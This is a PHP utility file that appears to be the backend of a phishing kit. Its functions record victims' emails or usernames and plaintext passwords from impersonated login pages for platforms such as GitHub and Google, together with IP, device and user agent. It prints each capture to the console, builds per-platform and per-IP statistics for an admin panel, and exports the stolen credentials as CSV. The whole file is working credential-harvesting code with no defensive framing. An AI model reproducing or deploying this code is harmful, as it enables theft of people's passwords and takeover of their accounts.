<?php
/**
 * Utility Functions
 * Reusable functions for logging, validation, and display
 */

require_once 'config.php';

/**
 * Log captured credentials
 * @param string $platform The platform name (github, google, etc.)
 * @param array $credentials The captured credentials
 */
function logCredentials($platform, $credentials) {
    $timestamp = date('Y-m-d H:i:s');
    $ip = getClientIP();
    $userAgent = getUserAgent();
    $device = getDeviceType();
    
    // Format: [timestamp] | Platform | IP | Device | Email/Username | Password | User-Agent
    $logEntry = sprintf(
        "[%s] | %s | IP: %s | Device: %s | Email/User: %s | Password: %s | UA: %s\n",
        $timestamp,
        strtoupper($platform),
        $ip,
        $device,
        $credentials['email'] ?? $credentials['username'] ?? 'unknown',
        $credentials['password'] ?? 'unknown',
        $userAgent
    );
    
    file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
    logToStderr($platform, $credentials);
    return true;
}

/**
 * Log to stderr for real-time display
 */
function logToStderr($platform, $credentials) {
    $stderr = fopen('php://stderr', 'w');
    if ($stderr) {
        fprintf($stderr, "\n╔════════════════════════════════════════════════════════════╗\n");
        fprintf($stderr, "║ [%s LOGIN CAPTURED]%s║\n", 
            strtoupper($platform), 
            str_repeat(' ', 27 - strlen($platform))
        );
        
        if (isset($credentials['email'])) {
            fprintf($stderr, "║ Email: %s\n", str_pad($credentials['email'], 50));
        } elseif (isset($credentials['username'])) {
            fprintf($stderr, "║ Username: %s\n", str_pad($credentials['username'], 48));
        }
        
        fprintf($stderr, "║ Password: %s\n", str_pad($credentials['password'] ?? 'unknown', 44));
        fprintf($stderr, "║ IP: %s\n", str_pad(getClientIP(), 49));
        fprintf($stderr, "║ Device: %s\n", str_pad(getDeviceType(), 47));
        fprintf($stderr, "║ Time: %s\n", date('Y-m-d H:i:s'));
        fprintf($stderr, "╚════════════════════════════════════════════════════════════╝\n\n");
        fclose($stderr);
    }
}

/**
 * Sanitize input
 */
function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

/**
 * Parse log file and return entries
 */
function getLogEntries($limit = null) {
    if (!file_exists(LOG_FILE)) {
        return [];
    }
    
    $lines = file(LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($limit) {
        $lines = array_slice($lines, -$limit);
    }
    return array_reverse($lines);
}

/**
 * Parse a log line into structured data
 */
function parseLogLine($line) {
    $pattern = '/\[([^\]]+)\]\s*\|\s*([^\|]+)\s*\|\s*IP:\s*([^\|]+)\s*\|\s*Device:\s*([^\|]+)\s*\|\s*Email\/User:\s*([^\|]+)\s*\|\s*Password:\s*([^\|]+)\s*\|\s*UA:\s*(.+)/';
    
    if (preg_match($pattern, $line, $matches)) {
        return [
            'timestamp' => trim($matches[1]),
            'platform' => trim($matches[2]),
            'ip' => trim($matches[3]),
            'device' => trim($matches[4]),
            'credential' => trim($matches[5]),
            'password' => trim($matches[6]),
            'userAgent' => trim($matches[7]),
        ];
    }
    return null;
}

/**
 * Get statistics from logs
 */
function getStatistics() {
    $entries = getLogEntries();
    $stats = [
        'total_captures' => count($entries),
        'platforms' => [],
        'devices' => [],
        'ips' => [],
        'latest' => null,
    ];
    
    foreach ($entries as $line) {
        $data = parseLogLine($line);
        if ($data) {
            // Count by platform
            $platform = $data['platform'];
            $stats['platforms'][$platform] = ($stats['platforms'][$platform] ?? 0) + 1;
            
            // Count by device
            $device = $data['device'];
            $stats['devices'][$device] = ($stats['devices'][$device] ?? 0) + 1;
            
            // Count by IP
            $ip = $data['ip'];
            $stats['ips'][$ip] = ($stats['ips'][$ip] ?? 0) + 1;
            
            // Latest entry
            if (!$stats['latest']) {
                $stats['latest'] = $data;
            }
        }
    }
    
    arsort($stats['platforms']);
    arsort($stats['devices']);
    arsort($stats['ips']);
    
    return $stats;
}

/**
 * Check admin authentication
 */
function isAdmin() {
    return isset($_SESSION['admin']) && $_SESSION['admin'] === true;
}

/**
 * Verify admin password
 */
function verifyAdminPassword($password) {
    return hash_equals(ADMIN_PASSWORD, $password);
}

/**
 * Get session duration in minutes
 */
function getSessionDuration() {
    if (!isset($_SESSION['admin_login_time'])) {
        return 0;
    }
    return round((time() - $_SESSION['admin_login_time']) / 60);
}

/**
 * Export logs as CSV
 */
function exportToCSV() {
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="captures_' . date('Y-m-d_H-i-s') . '.csv"');
    
    $output = fopen('php://output', 'w');
    fputcsv($output, ['Timestamp', 'Platform', 'IP', 'Device', 'Email/Username', 'Password', 'User-Agent']);
    
    $entries = getLogEntries();
    foreach ($entries as $line) {
        $data = parseLogLine($line);
        if ($data) {
            fputcsv($output, [
                $data['timestamp'],
                $data['platform'],
                $data['ip'],
                $data['device'],
                $data['credential'],
                $data['password'],
                $data['userAgent'],
            ]);
        }
    }
    fclose($output);
}
